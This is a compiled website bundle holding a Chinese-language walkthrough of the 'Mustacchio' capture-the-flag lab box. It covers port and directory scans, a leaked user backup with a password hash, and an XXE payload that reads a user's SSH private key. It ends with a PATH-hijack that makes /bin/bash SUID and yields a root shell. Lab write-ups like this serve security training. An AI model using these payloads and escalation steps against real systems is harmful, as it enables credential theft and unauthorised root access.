"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[1791],{18502:(n,t,e)=>{e.r(t),e.d(t,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>r,metadata:()=>o,toc:()=>l});var a=e(74848),s=e(28453);const r={sidebar_position:34,tags:["Easy","Linux","\u5bc6\u7801\u7834\u89e3","XXE","PATH-Linux"],title:"Mustacchio",description:"Mustacchio",sidebar_label:"Mustacchio",slug:"/tryhackme/34"},i="Mustacchio",o={id:"box/TryHackMe/34",title:"Mustacchio",description:"Mustacchio",source:"@site/docs/box/TryHackMe/34.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/34",permalink:"/docs/tryhackme/34",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u5bc6\u7801\u7834\u89e3",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3"},{label:"XXE",permalink:"/docs/tags/xxe"},{label:"PATH-Linux",permalink:"/docs/tags/path-linux"}],version:"current",sidebarPosition:34,frontMatter:{sidebar_position:34,tags:["Easy","Linux","\u5bc6\u7801\u7834\u89e3","XXE","PATH-Linux"],title:"Mustacchio",description:"Mustacchio",sidebar_label:"Mustacchio",slug:"/tryhackme/34"},sidebar:"boxSidebar",previous:{title:"Agent T",permalink:"/docs/tryhackme/33"},next:{title:"Smag Grotto",permalink:"/docs/tryhackme/35"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80 - HTTP",id:"80---http",level:2},{value:"8765",id:"8765",level:3},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"Barry",id:"barry",level:3},{value:"Barry --&gt; root",id:"barry----root",level:3}];function u(n){const t={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(t.h1,{id:"mustacchio",children:"Mustacchio"}),"\n",(0,a.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-22-151:~# nmap -sT  -p- --min-rate 1000 10.10.38.75\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-22 12:39 BST\nNmap scan report for ip-10-10-38-75.eu-west-1.compute.internal (10.10.38.75)\nHost is up (0.00035s latency).\nNot shown: 65532 filtered ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8765/tcp open  ultraseek-http\nMAC Address: 02:FF:EA:DF:6A:45 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 100.65 seconds\nroot@ip-10-10-22-151:~# nmap -sTCV  -p 22,80,8765 --min-rate 1000 10.10.38.75\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-22 12:42 BST\nNmap scan report for ip-10-10-38-75.eu-west-1.compute.internal (10.10.38.75)\nHost is up (0.00017s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)\n|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)\n|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (EdDSA)\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry \n|_/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Mustacchio | Home\n8765/tcp open  http    nginx 1.10.3 (Ubuntu)\n|_http-server-header: nginx/1.10.3 (Ubuntu)\n|_http-title: Mustacchio | Login\nMAC Address: 02:FF:EA:DF:6A:45 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,a.jsx)(t.h2,{id:"80---http",children:"80 - HTTP"}),"\n",(0,a.jsx)(t.p,{children:"\u8bbf\u95ee 80 \u7ad9\u70b9"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191231.png",alt:"20240601191231"})}),"\n",(0,a.jsx)(t.p,{children:"\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-22-151:~# gobuster dir -u http://10.10.38.75/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.38.75/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/08/22 12:48:33 Starting gobuster\n===============================================================\n/images (Status: 301)\n/index.html (Status: 200)\n/blog.html (Status: 200)\n/about.html (Status: 200)\n/contact.html (Status: 200)\n/gallery.html (Status: 200)\n/custom (Status: 301)\n/robots.txt (Status: 200)\n/fonts (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2023/08/22 12:52:22 Finished\n===============================================================\n"})}),"\n",(0,a.jsx)(t.p,{children:"\u8bbf\u95ee /custom \u65f6\u6211\u53d1\u73b0\u4e00\u4e2a User.bak \u6587\u4ef6"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191253.png",alt:"20240601191253"})}),"\n",(0,a.jsx)(t.p,{children:"\u6211\u5c06\u5176\u4e0b\u8f7d\u4e0b\u6765, \u67e5\u770b\u53d1\u73b0\u5b83\u662f\u4e00\u4e2a\u8d26\u53f7, \u5e76\u4e14\u5bc6\u7801\u4e5f\u662f\u52a0\u5bc6\u5f97, \u6240\u4ee5\u6211\u5c31\u5148\u89e3\u5bc6"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-22-151:~/Downloads# strings users.bak \nSQLite format 3\ntableusersusers\nCREATE TABLE users(username text NOT NULL, password text NOT NULL)\n]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b\n"})}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191311.png",alt:"20240601191311"})}),"\n",(0,a.jsx)(t.h3,{id:"8765",children:"8765"}),"\n",(0,a.jsx)(t.p,{children:"\u8fd9\u662f\u4e00\u4e2a\u767b\u9646\u9875\u9762, \u4f7f\u7528\u4e0a\u9762\u5f97\u5230\u5f97\u5185\u5bb9\u8fdb\u884c\u767b\u9646\u53d1\u73b0\u53ef\u4ee5\u767b\u9646"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191327.png",alt:"20240601191327"})}),"\n",(0,a.jsx)(t.p,{children:"\u767b\u9646\u540e\u9875\u9762\u663e\u793a\u4e3a\u4e00\u4e2a\u63d0\u4ea4\u8bc4\u8bba,"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191339.png",alt:"20240601191339"})}),"\n",(0,a.jsx)(t.p,{children:"\u6211\u5728\u8fd9\u91cc\u968f\u610f\u5f97\u63d0\u4ea4\u4e00\u4e9b\u6570\u636e, \u53d1\u73b0\u4e0b\u9762\u51fa\u73b0\u4e86\u53e6\u4e00\u4e9b\u5185\u5bb9"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191352.png",alt:"20240601191352"})}),"\n",(0,a.jsx)(t.p,{children:"\u8fd9\u8868\u660e\u53ef\u80fd\u662f XXE \u6f0f\u6d1e, \u4f46\u662f\u6211\u4e0d\u77e5\u9053\u4e0a\u4f20\u5f97\u683c\u5f0f\u662f\u4ec0\u4e48? \u6211\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\u53d1\u73b0"}),"\n",(0,a.jsxs)(t.ul,{children:["\n",(0,a.jsx)(t.li,{children:"\u4e00\u4e2a bak \u6587\u4ef6, \u4e0b\u8f7d\u4e0b\u6765\u540e\u53d1\u73b0\u6b63\u662f\u6211\u4eec\u9700\u8981\u5f97 XML \u683c\u5f0f, \u6240\u4ee5\u53ef\u4ee5\u80af\u5b9a\u662f XXE \u6f0f\u6d1e"}),"\n",(0,a.jsx)(t.li,{children:"\u4e00\u4e2a\u7528\u6237\u9700\u8981\u4f7f\u7528\u5bc6\u94a5\u767b\u9646"}),"\n"]}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191406.png",alt:"20240601191406"})}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:'root@ip-10-10-22-151:~/Downloads# cat dontforget.bak \n<?xml version="1.0" encoding="UTF-8"?>\n<comment>\n  <name>Joe Hamd</name>\n  <author>Barry Clad</author>\n  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could\\u2019ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could\\u2019ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>\n</comment>\n'})}),"\n",(0,a.jsx)(t.p,{children:"\u6839\u636e\u6b64 XML \u6784\u5efa\u6587\u4ef6\u8bfb\u53d6 payload , \u8bfb\u53d6 Barry  \u5f97 id_rsa"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY example SYSTEM "/home/barry/.ssh/id_rsa"> ]>\n<comment>\n  <name>&example;</name>\n  <author>Barry Clad</author>\n  <com></com>\n</comment>\n'})}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191426.png",alt:"20240601191426"})}),"\n",(0,a.jsx)(t.p,{children:"\u7136\u540e\u6211\u4f7f\u7528\u8be5\u79c1\u94a5\u8fdb\u884c\u767b\u9646, \u544a\u8bc9\u6211\u9700\u8981\u5bc6\u7801, \u6240\u4ee5\u6211\u5f00\u59cb\u7834\u89e3"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191436.png",alt:"20240601191436"})}),"\n",(0,a.jsx)(t.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(t.h3,{id:"barry",children:"Barry"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191451.png",alt:"20240601191451"})}),"\n",(0,a.jsx)(t.p,{children:"\u63a5\u7740\u6211\u5728 joe \u7528\u6237\u5bb6\u76ee\u5f55\u53d1\u73b0\u4e00\u4e2a root \u7684 SUID  \u7a0b\u5e8f"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191502.png",alt:"20240601191502"})}),"\n",(0,a.jsx)(t.p,{children:"\u901a\u8fc7\u5206\u6790\u8be5\u7a0b\u5e8f, \u6211\u53d1\u73b0\u5176\u4f7f\u7528\u4e86 tail \u547d\u4ee4\u4f46\u662f\u6ca1\u6709\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601191513.png",alt:"20240601191513"})}),"\n",(0,a.jsx)(t.h3,{id:"barry----root",children:"Barry --\x3e root"}),"\n",(0,a.jsx)(t.p,{children:"\u901a\u8fc7\u4fee\u6539\u73af\u5883\u53d8\u91cf\u6765\u83b7\u53d6 root \u6743\u9650"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"\nbarry@mustacchio:/home/joe$ cd /tmp\nbarry@mustacchio:/tmp$ cat << EOF > tail\n> #!/bin/bash\n> chmod u+s /bin/bash\n> EOF\nbarry@mustacchio:/tmp$ chmod +x tail \nbarry@mustacchio:/tmp$ cat tail \n#!/bin/bash\nchmod u+s /bin/bash\nbarry@mustacchio:/tmp$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\nbarry@mustacchio:/tmp$ export PATH=$PWD:$PATH\nbarry@mustacchio:/tmp$ echo $PATH\n/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\nbarry@mustacchio:/tmp$ cd /home/joe/\nbarry@mustacchio:/home/joe$ ls\nlive_log\nbarry@mustacchio:/home/joe$ ls -al /bin/bash\n-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash\nbarry@mustacchio:/home/joe$ ./live_log \nLive Nginx Log Readerbarry@mustacchio:/home/joe$ \nbarry@mustacchio:/home/joe$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash\nbarry@mustacchio:/home/joe$ /bin/bash -p\nbash-4.3# id\nuid=1003(barry) gid=1003(barry) euid=0(root) groups=1003(barry)\n"})})]})}function h(n={}){const{wrapper:t}={...(0,s.R)(),...n.components};return t?(0,a.jsx)(t,{...n,children:(0,a.jsx)(u,{...n})}):u(n)}},28453:(n,t,e)=>{e.d(t,{R:()=>i,x:()=>o});var a=e(96540);const s={},r=a.createContext(s);function i(n){const t=a.useContext(r);return a.useMemo((function(){return"function"==typeof n?n(t):{...t,...n}}),[t,n])}function o(n){let t;return t=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:i(n.components),a.createElement(r.Provider,{value:t},n.children)}}}]);